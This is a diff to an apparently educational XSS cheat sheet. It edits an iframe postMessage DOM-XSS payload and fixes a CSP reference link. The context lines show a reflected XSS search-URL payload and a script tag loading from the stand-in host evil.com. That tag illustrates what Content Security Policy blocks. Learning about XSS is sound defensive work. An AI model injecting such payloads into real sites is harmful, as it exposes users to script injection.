@@ -97,7 +97,7 @@ https://insecure-website.com/index?search="><script>alert(document.domain)</scri
 Exploit
 
 ```html
-<iframe src="https://vuln.website/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+<iframe src=https://vuln.website/ onload='this.contentWindow.postMessage("<img src=1 onerror=print()>","*")'>
 ```
 
 ### <mark style="color:yellow;">**jQuery**</mark>
@@ -371,4 +371,4 @@ CSP restrict the resources (such as scripts and images) that a page can load and
 * Restricting Remote Scripts
   * `<script src="https://evil.com/hacked.js"></script>` will not work
 * Restricting Unsafe JavaScript
-* Others [https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html)
+* Others [https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
